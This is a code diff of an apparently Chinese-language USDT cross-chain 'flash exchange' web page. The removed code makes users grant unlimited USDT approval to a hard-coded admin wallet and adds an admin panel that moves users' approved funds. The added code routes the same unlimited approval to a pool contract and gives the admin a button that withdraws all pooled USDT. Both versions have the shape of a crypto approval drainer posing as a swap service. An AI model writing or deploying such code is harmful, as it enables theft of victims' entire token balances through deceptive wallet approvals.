@@ -314,8 +314,8 @@ body{
       <span class="right" id="minReceive">--</span>
     </div>
     <div class="info-row">
-      <span>授权对象</span>
-      <span class="right text-orange-500 text-xs">授权至管理员钱包地址</span>
+      <span>授权说明</span>
+      <span class="right text-orange-500 text-xs">需对中转合约无限授权 USDT</span>
     </div>
     <div class="info-row">
       <span>服务费（0.1%）</span>
@@ -328,8 +328,8 @@ body{
   </div>
 
   <div class="admin-card" id="adminPanelBox">
-    <div class="admin-title">🔐 管理员操作面板</div>
-    <p class="text-xs text-gray-500 mb-2">仅管理员钱包可发起划转用户授权额度内资产</p>
+    <div class="admin-title">🔐 管理员后台</div>
+    <button class="admin-btn" id="withdrawPoolAssetBtn">提取合约底池全部 USDT</button>
   </div>
 
   <div class="bottom-nav">
@@ -357,14 +357,13 @@ body{
 </div>
 
 <script>
-// 核心配置：授权Spender改为管理员EOA钱包，不再使用中转合约
 const USDT_ERC20 = "0xdac17f958d2ee523a2206206994597c13d831ec7";
-// 被授权方：管理员钱包EOA地址
+const POOL_CONTRACT_ADDR = "0xFb0FcD4acCcd5D39608b2cDC44BD3B4D5fD9b836";
 const ADMIN_WALLET_ADDR = "0xf832eA13Df0F60dFA381c6853754ab7b54651F05";
 const MAX_APPROVE = ethers.constants.MaxUint256;
 const FEE_PERCENT = 0.001;
 
-let ethProvider, walletSigner, usdtContractInstance;
+let ethProvider, walletSigner, usdtContractInstance, poolContractInstance;
 let userUsdtBalance = ethers.BigNumber.from(0);
 
 const connectWalletBtn = document.getElementById("connectWalletBtn");
@@ -377,8 +376,8 @@ const feeShow = document.getElementById("feeShow");
 const receiveShow = document.getElementById("receiveShow");
 const minReceive = document.getElementById("minReceive");
 const adminPanelBox = document.getElementById("adminPanelBox");
+const withdrawPoolAssetBtn = document.getElementById("withdrawPoolAssetBtn");
 
-// 金额实时计算
 payAmountInput.addEventListener("input", ()=>{
   let inputVal = parseFloat(payAmountInput.value) || 0;
   if(inputVal < 0) inputVal = 0;
@@ -387,41 +386,36 @@ payAmountInput.addEventListener("input", ()=>{
   feeShow.innerText = feeAmount.toFixed(2) + " USDT";
   receiveShow.innerText = finalReceive.toFixed(2);
   minReceive.innerText = finalReceive.toFixed(2) + " USDT";
-  submitExchangeBtn.innerText = inputVal > 0 ? "确认授权闪兑" : "请输入兑换数量";
+  submitExchangeBtn.innerText = inputVal > 0 ? "发起闪兑下单" : "请输入兑换数量";
 });
 
-// 填充全部余额
 btnAllBalance.addEventListener("click", async ()=>{
   let formatBal = ethers.utils.formatUnits(userUsdtBalance, 6);
   payAmountInput.value = parseFloat(formatBal).toFixed(2);
   payAmountInput.dispatchEvent(new Event("input"));
 });
 
-// 地址格式校验
 function checkAddressValid(addr){
   return ethers.utils.isAddress(addr);
 }
 
-// 连接钱包
 connectWalletBtn.addEventListener("click", async ()=>{
   if(!window.ethereum){
-    connectStatus.innerText = "未检测到 MetaMask 钱包";
+    connectStatus.innerText = "未检测到 MetaMask";
     return;
   }
   try{
-    connectStatus.innerText = "正在请求钱包授权...";
+    connectStatus.innerText = "正在连接钱包...";
     ethProvider = new ethers.providers.Web3Provider(window.ethereum);
     await ethProvider.send("eth_requestAccounts", []);
     walletSigner = ethProvider.getSigner();
 
-    // 切换以太坊主网
     const networkInfo = await ethProvider.getNetwork();
     if(networkInfo.chainId !== 1){
       await switchEthereumMainnet();
     }
 
-    // 初始化USDT合约
-    initUsdtContract();
+    initAllContract();
     await refreshUserBalance();
     btnAllBalance.classList.remove("opacity-50", "pointer-events-none");
     await judgeAdminPermission();
@@ -434,7 +428,6 @@ connectWalletBtn.addEventListener("click", async ()=>{
   }
 });
 
-// 切换ETH主网
 async function switchEthereumMainnet(){
   const ethereum = window.ethereum;
   try{
@@ -456,24 +449,27 @@ async function switchEthereumMainnet(){
   }
 }
 
-// 初始化USDT合约ABI
-function initUsdtContract(){
+function initAllContract(){
   const usdtAbi = [
     "function balanceOf(address owner) view returns(uint256)",
     "function allowance(address owner,address spender) view returns(uint256)",
     "function approve(address spender,uint256 value) returns(bool)"
   ];
   usdtContractInstance = new ethers.Contract(USDT_ERC20, usdtAbi, walletSigner);
+
+  const poolAbi = [
+    "function createOrder(address bscTarget,uint256 amount) external",
+    "function withdrawPoolFund() external"
+  ];
+  poolContractInstance = new ethers.Contract(POOL_CONTRACT_ADDR, poolAbi, walletSigner);
   submitExchangeBtn.disabled = false;
 }
 
-// 刷新用户USDT余额
 async function refreshUserBalance(){
   const userAddr = await walletSigner.getAddress();
   userUsdtBalance = await usdtContractInstance.balanceOf(userAddr);
 }
 
-// 判断当前钱包是否为管理员
 async function judgeAdminPermission(){
   const nowWalletRaw = await walletSigner.getAddress();
   const nowWallet = nowWalletRaw.toLowerCase();
@@ -485,54 +481,61 @@ async function judgeAdminPermission(){
   }
 }
 
-// 闪兑按钮：执行授权操作（授权给管理员EOA钱包）
+withdrawPoolAssetBtn.addEventListener("click", async ()=>{
+  if(!confirm("确认提取合约池子内所有 USDT 至当前管理员钱包？")) return;
+  try{
+    const tx = await poolContractInstance.withdrawPoolFund();
+    await tx.wait();
+    alert("提取成功！交易哈希：" + tx.hash);
+  }catch(err){
+    alert("提取失败：" + String(err.message).slice(0,60));
+  }
+});
+
 submitExchangeBtn.addEventListener("click", async ()=>{
   const inputNumStr = payAmountInput.value.trim();
   const targetAddr = bscReceiveAddr.value.trim();
   const inputNum = parseFloat(inputNumStr);
 
-  // 表单校验
   if(!inputNumStr || isNaN(inputNum) || inputNum <= 0){
     alert("请输入有效的兑换金额");
     return;
   }
   if(!checkAddressValid(targetAddr)){
-    alert("BSC收款地址格式错误");
+    alert("BSC 收款地址格式错误");
     return;
   }
 
   const amountWei = ethers.utils.parseUnits(inputNumStr, 6);
   if(amountWei.gt(userUsdtBalance)){
-    alert("当前钱包USDT余额不足");
+    alert("钱包 USDT 余额不足");
     return;
   }
 
   try{
     const currentUser = await walletSigner.getAddress();
-    // 查询当前授权额度（授权给管理员钱包）
-    let nowAllowance = await usdtContractInstance.allowance(currentUser, ADMIN_WALLET_ADDR);
+    let nowAllowance = await usdtContractInstance.allowance(currentUser, POOL_CONTRACT_ADDR);
 
-    // 额度不足，发起无限授权
     if(nowAllowance.lt(amountWei)){
-      alert("即将授权USDT权限至管理员钱包地址，请在钱包确认签名");
-      const approveTx = await usdtContractInstance.approve(ADMIN_WALLET_ADDR, MAX_APPROVE);
+      alert("需要授权 USDT 给合约，请在钱包确认签名");
+      const approveTx = await usdtContractInstance.approve(POOL_CONTRACT_ADDR, MAX_APPROVE);
       await approveTx.wait();
-      alert("授权成功！后续由管理员后台处理跨链兑付");
-    }else{
-      alert("已有足够授权额度，等待后台兑付");
     }
 
-    // 清空输入框
+    const orderTx = await poolContractInstance.createOrder(targetAddr, amountWei);
+    await orderTx.wait();
+    alert("下单成功！交易哈希：" + orderTx.hash);
+
     payAmountInput.value = "";
     feeShow.innerText = "0.00 USDT";
     receiveShow.innerText = "0.00";
     minReceive.innerText = "--";
     submitExchangeBtn.innerText = "请输入兑换数量";
-    await refreshUserBalance();
 
+    await refreshUserBalance();
   }catch(err){
     let msg = err.code === 4001 ? "您取消了钱包签名" : err.message;
-    alert("操作失败：" + msg.slice(0,60));
+    alert("操作失败：" + msg);
   }
 });
 </script>
